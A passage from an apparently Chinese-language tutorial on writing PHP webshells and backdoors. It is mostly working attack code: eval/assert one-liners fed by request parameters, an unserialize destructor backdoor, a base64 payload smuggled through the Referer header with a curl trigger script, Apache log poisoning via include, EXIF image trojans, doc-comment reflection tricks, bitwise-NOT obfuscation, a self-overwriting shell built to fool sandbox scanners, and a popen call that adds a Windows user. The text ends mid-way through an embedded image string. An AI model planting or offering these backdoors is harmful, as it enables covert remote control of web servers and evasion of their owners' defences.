php 
    $new_array = array_map("ass\x65rt", (array)$_REQUEST['op']);
?>
//http://localhost/test/test.php?op=eval($_GET[1]): 菜刀密码: 1
```

### 0x18: PHP的序列化、反序列化特性布置后门 

```text
php
    class Example
    {
       var $var = '';
       function __destruct()
       {
          eval($this->var);
       }
    }
    //$exp =  new Example();
    //$exp->var = "phpinfo();";
    //die(serialize($exp));
    unserialize($_GET['saved_code']);
?>
O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}  
http://localhost/shell/index.php?saved_code=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}  
原理是: 被序列化的对象在反序列化的时候会自动调用它的析构函数
```

### 0x19: 使用HTTP头部的其他非常用字段进行指令的传输 

```text
通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果。

backdoor:
php
    header('Content-type:text/html;charset=utf-8');
    //将$_SERVER['HTTP_REFERER']中的参数解析到本地变量中，放到$a数组中
    parse_str($_SERVER['HTTP_REFERER'], $a);
    //判断数组变量$a中的第一个元素是否是"10"、并且数组元素个数是否是9个
    if(reset($a) == '10' && count($a) == 9)
    {    
        //取出数组$a中索引6的元素，即我们传入的实际payload，并进行base64_decode解码
        eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));
    }
?>

利用方式:
php
    header('Content-type:text/html;charset=utf-8');
    //要执行的代码
    $code = "phpinfo();";
    //进行base64编码
    $code = base64_encode($code);
    //构造referer字符串
    $referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";
    //后门url
    $url = 'http://localhost/shell/index.php';
    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_HEADER => FALSE,
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_REFERER => $referer
    );
    curl_setopt_array($ch, $options);
    echo curl_exec($ch);
?>

原理分析：
http://www.php.net/manual/zh/function.parse-str.php
和extract()作用类似，将外部传入的参数注册为本地变量

http://www.w3school.com.cn/php/func_array_reset.asp
reset() 函数把数组的内部指针指向第一个元素，并返回这个元素的值

http://www.w3school.com.cn/php/func_array_slice.asp
array_slice(array,offset,length,preserve)
array_slice() 函数在数组中根据条件取出一段值，并返回。

http://www.w3school.com.cn/php/func_string_implode.asp
implode

这个webshell通过编码的referer来传递攻击载荷，HTTP通信的头部的任何字段、或者HTTP的数据部分的任何字段都可以当作webshell的payload来传递数据的。
```

### 0x20: 乱序拼接法 

```text
php  
    @$_="s"."s"."e"."r";  
    @$_="a".$_."t";  
    @$_(${"_P"."OS"."T"}[1-2-5]);
?>  
注意这里双层${}的作用，里面那个${}是为了让_POST[-6]被解析出来的，如果不用这个花括号，则这个"_POST[]"就变成一个纯文本了，加上这个${}之后，变量原本的变量特性就表现出来了，
也就能正确传参了

php
    $aaaaa="sewtemznypianol";
    $char_system=$aaaaa{0}.$aaaaa{8}.$aaaaa{0}.$aaaaa{3}.$aaaaa{1}.$aaaaa{5};
    //die($char_system);
    $aaaaaa="edoced46esab_n";
    $char_base64_decode=$aaaaaa{11}.$aaaaaa{10}.$aaaaaa{9}.$aaaaaa{8}.$aaaaaa{7}.$aaaaaa{6}.$aaaaaa{12}.$aaaaaa{5}.$aaaaaa{4}.$aaaaaa{3}.
　　　$aaaaaa{2}.$aaaaaa{1}.$aaaaaa{0};
    die($char_base64_decode);
    echo $char_system($char_base64_decode("aXBjb25maWc="));
?>
这种webshell的编写思路很巧妙，和"乱序插入"还不是一个做法
1) "乱序插入"是在一段正常的webshell代码中随机插入一些杂乱的无意义的字母，然后再在下面使用preg_replace之类的正则替换来去除掉这些"混淆盐字母"，以还原出原有的正常的
　　webshell代码
2) 这种做法是先定义一个"字母池"，这个"字母池"包含有我们需要构造的关键函数的字符。我们通过从这个字母池中选取特定的索引下的字母，以此来构造出我们想要
　　的"动态函数"(system、base64_decode)
```

### 0x21：利用apache的错误日志进行webshell的注入 

```text
用了apche服务器的错误日志文件，当访问一个不存在的连接时,日志中会记录下这样的一句话
[Tue Jan 14 09:48:01.664731 2014] [core:error] [pid 9412:tid 1876] (20024)The given path is misformatted or contained invalid characters: 
[client ::1:10248] AH00127: Cannot map GET /shell/ HTTP/1.1 to file
这个和很多CMS中的功能很类似，会记录一些运行信息
    1) 出错信息，包含导致出错的原始语句，问题也就发生在这里，即用户可能有机会控制这个日志文件的内容
    2) 访问记录(例如: 请求URL)，和(1)同样的道理，这属于用户可控的信息
    3) 其他的HTTP相关信息

后门back door: 这是留待以后用来引入带后门的日志文件使用的
php
    include($_GET['f']);  
?>

攻击触发脚本，向日志文件中打入payload
http://localhost/shell/attack.php
php  
    // 1. 初始化  
    $ch = curl_init();  
    // 2. 设置选项，包括URL  
    curl_setopt($ch, CURLOPT_URL, "http://localhost/shell/");  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);  
    curl_setopt($ch, CURLOPT_HEADER, 0);  
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/4");  
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);  
    // 3. 执行并获取HTML文档内容  
    $output = curl_exec($ch);  
    // 4. 释放curl句柄  
    curl_close($ch);  
?>  
执行这个脚本后，会在apache的错误日志中留下原始的访问记录
[Tue Jan 14 09:48:01.664731 2014] [core:error] [pid 9412:tid 1876] (20024)The given path is misformatted or contained invalid characters: 
[client ::1:10248] AH00127: Cannot map GET /shell/ HTTP/1.1 to file

之后吧log的地址当做参数传入即可，这里log位置须自行查找
http://localhost/shell/index.php?f=E:\wamp\logs\apache_error.log 

```

### 0x22: 利用字符的运算符来进行webshell的构造 

```text
php
    echo 'a'|'d';//e!  
?>

字符串和数字的强转:
php  
    $_="abc";
    echo $_+1;  //1
?>
php  
    $_="1abc";
    echo $_+1;  //2
?>
字符串会被强制转换成数字，如果不能转，就返回0
http://www.blogjava.net/zuofei-bie/archive/2010/03/31/317092.html
php  
    $_="abc";  
    echo ++$_;  //abd  
?>
这种"++"和"+"的表现形式还不太一样，"++"是把字符串最后一个字母进行"+1"
```

### 0x23: 使用PHP的管道技术执行系统命令后门 

```text
open()
http://www.w3school.com.cn/php/func_filesystem_popen.asp
 
php
    /*
        PHP中如何增加一个系统用户
        下面是一段例程，
        用户名: test
        密码是: 111
    */
    $command = "net user";
    $useradd = "add ";
    $pwd = "111";
    $user = "test";  
    $user_add = sprintf("%s "%s %s"", $command, $useradd, $user, $pwd);
    $fp = @popen($user_add,"w");  
    @pclose($fp);
?>

命令执行成功，添加账户成功。PHP执行命令有很多方法，eval、passthru、system、assert、popen、exec、shell_exec
```

### 0x24: 利用PHP的指令替换编写webshell 

```text
php   
    $cmd = `dir`;  
    echo $cmd;   
?>  
波浪线下面那个键括起来的字符串可以当命令执行。
```

### 0x25: 利用一些CMS等开源框架进行本地变量覆盖 

```text
php
    foreach ($_GET as $key => $value)
    {
        $result .= "$key=$value&";
    }
    /*
        很多开源框架都有类似上面这段功能的代码，用于将用户输入的参数进行批量的本地化
        但是这也往往导致了"本地变量覆盖漏洞"
        同时也可以被黑客用来在原本正常的文件中插入
            parse_str($result);
            $sys($command);
        这段代码来进行getshell
    */
    ..
    parse_str($result);
    $sys($command);
?>
http://localhost/shell/index.php?sys=system&command=dir
```

### 0x26：基于图片文件非可显示字段\(例如图片头meta\)部署PHP图片木马

```text
和传统的把php代码type进图片不一样，这里介绍另一种图片木马的利用方式。
图片木马相关知识
http://en.wikipedia.org/wiki/Exchangeable_image_file_format
http://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html
Malware Hidden Inside JPG EXIF Headers  
http://cn2.php.net/manual/zh/function.exif-read-data.php
exif_read_data
exif_read_data() 函数从 JPEG 或 TIFF 图像文件中读取 EXIF 头信息。这样就可以读取数码相机产生的元数据

php
    echo "img.jpg:
\n";
    $exif = exif_read_data('img.jpg', 'IFD0');
    //IFD0     所有 IFD0 的标记数据。在标准的图像文件中这包含了图像大小及其它。
    echo $exif===false ? "No header data found.
" : "Image contains headers
";
    echo "
";

    //FILE    FileName, FileSize, FileDateTime, SectionsFound
    $exif = exif_read_data('img.jpg', 'FILE', true);
    echo "img.jpg:
\n";
    foreach ($exif as $key => $section)
    {
        foreach ($section as $name => $val)
        {
            echo "$key.$name: $val
\n";
        }
        echo "
";
    }
?>

这里提出了一种隐藏webshell的新思路
1. 和传统的图片木马不一样，传统的图片木马就是简单的利用type命令把webshell代码接在一个正常的图片尾部，然后在另一个脚本中使用include包含进来，PHP解析解析引擎会忽略在
　　PHP看来毫无意义的图片数据的乱码，而去执行在文件结尾的PHP代码，这是一种很好的利用方式
2. 而关于这种图片木马，可以有一种更加精确的利用方式，图片(也就是EXIT格式的文件)的每个区段都是有精确意义的，我们可以将我们的webshell准确地放置在这些指定的区域，
　　然后使用exif_read_data去读取读取出来，然后使用preg_replace的"e"开关去动态执行，或者使用动态函数去动态执行
3. 这个可以用来规避include那种类型的黑名单检测

将webshell代码放置在EXIT的头部区域中，这里挑选:
IFD0->
1. ImageDescription: /.*/e
2. Subject: eval(\$_POST[1])
(注意这里要使用winhex来进行ASCII字符的修改)

php  
    //FILE    FileName, FileSize, FileDateTime, SectionsFound
    $exif = exif_read_data('img.jpg', 'FILE', true);
    var_dump($exif['IFD0']['ImageDescription']);
    var_dump($exif['IFD0']['Subject']);
    preg_replace($exif['IFD0']['ImageDescription'], $exif['IFD0']['Subject'],'');
    //die();
?>
```

### 0x27: 将数据放在注释中并利用反射机制获取webshellcode

```text
http://www.8090sec.com/suixinbiji/111568.html
黑客将webshell放到了/**/注释中，然后利用类的反射机制获取到，进行动态函数的执行
PHP的反射类机制
ReflectionClass
http://cn2.php.net/manual/zh/reflectionclass.construct.php

ReflectionClass::getDocComment — 获取文档注释
http://cn2.php.net/manual/zh/reflectionclass.getdoccomment.php

这是最终的poc
php  
    /**   
    * eval($_POST[1]);
    */  
    class TestClass { }  
    $rc = new ReflectionClass('TestClass');  
    //获取当前文档的注释
    $comment = $rc->getDocComment();
    //die(var_dump($comment));

    $pos = strpos($comment,'eval');
    //die(var_dump($pos));  

    $eval=substr($comment,$pos,16);  
    //die($eval);
    eval($eval);
?>

更高级一点的用法，现有的webshell检测系统会基于文本特征进行匹配，为了对抗这个防御策略，原则上来说，黑客想要做的是将原本的webshell代码进行加花、换行、大小写变形，但是在一般情况下，PHP代码如果被变形了(例如换行)就无法正常执行了。但是在反射类利用姿势这个case下，代码的变形成为了可能

黑客在注释中可以任意插入花指令、换行等字符来绕过现有的特征检测机制
php
    /**
    * eva
    * l($_GE
    * T["c"]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass('TestClass');
    $str = $rc->getDocComment();
    die(var_dump($str));
    $evf=substr($str,strpos($str,'e'),3);
    $evf=$evf.substr($str,strpos($str,'l'),6);
    $evf=$evf.substr($str,strpos($str,'T'),8);
    $fu=substr($str,strpos($str,'as'),4);
    $fu=$fu.substr($str,strpos($str,'r'),2);
    $fu($evf);
?> 
```

### 0x28：webshell多态技术: 自毁型webshell

```text
毁性WebShell
php
    /*
        现在的PHP的webshell的检测基本用的是对PHP执行引擎进行hook进行动态检测
        即我们构造出一个沙箱，让目标脚本在里面执行一次，然后对执行的结果进行判断
        而我们的沙箱在触发这个脚本执行的时候由于没有给定准确的参数"code"，就会导致毁灭性覆写"fwrite ($fp, $content)"的结果
        这样，沙箱的执行结果就是一个普通的文本"helloworld"

        然后，管理员再去查看这个文件的时候，看到的就只是一个"helloworld"了

        这个是很针对"PHP的动态沙箱检测"的绕过的

        反而利用了沙箱的机制，沙箱导致了文件的毁坏
    */

    //$url = $_SERVER['PHP_SELF'];
    //$filename = end(explode('/',$url));
    //die($filename);
    if($_REQUEST["code"]==pany)
    {
        echo str_rot13('riny($_CBFG[pzq]);');
        eval(str_rot13('riny($_CBFG[pzq]);'));
    }
    else
    {
        $url = $_SERVER['PHP_SELF'];
        $filename = end(explode('/',$url));
           
        $content = 'helloworld';
        $fp = fopen ("$filename","w");
        if (fwrite ($fp, $content))
        {
            fclose ($fp);
            die ("error");
        }
        else
        {
            fclose ($fp);
            die ("good");
        }
        exit;
    }
?>
```

### 0x29: 利用本地变量注册技术 

```text
ttp://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html
利用extract函数将输入数据注册为本地变量，然后利用PHP的动态执行特性进行动态函数执行
http://www.php.net/manual/en/function.extract.php
php
    @extract ($_REQUEST);
    @die($ctime($atime));
?>
http://localhost/test/index.php?ctime=assert&atime=phpinfo()
```

### 0x30: 关于本地变量注册技术的利用姿势

```text
HP中有三种姿势可能导致本地变量注册，进而利用PHP的动态函数执行技巧进行WEBSHELL的构造
1) extract
2) parse_str
3) foreach(..) { $$key = $value; }
这三种在本文中都给出了相应例子 
```

### 0x31: 利用PHP的逻辑运算符进行WEBSHELL的编码 

```text
http://worm.cc/PHP中使用按位取反函数创建后门.html
WEBSHELL代码
php
    $x = ~"žŒŒš‹";
    $y = ~"—–‘™×Ö";
    $x($y);
?>

生成原理
php
    echo ~"assert";
    echo ~"phpinfo()";
?>
注意这个文件一定要保存为ANSI格式
```

![](data:image/png;base64,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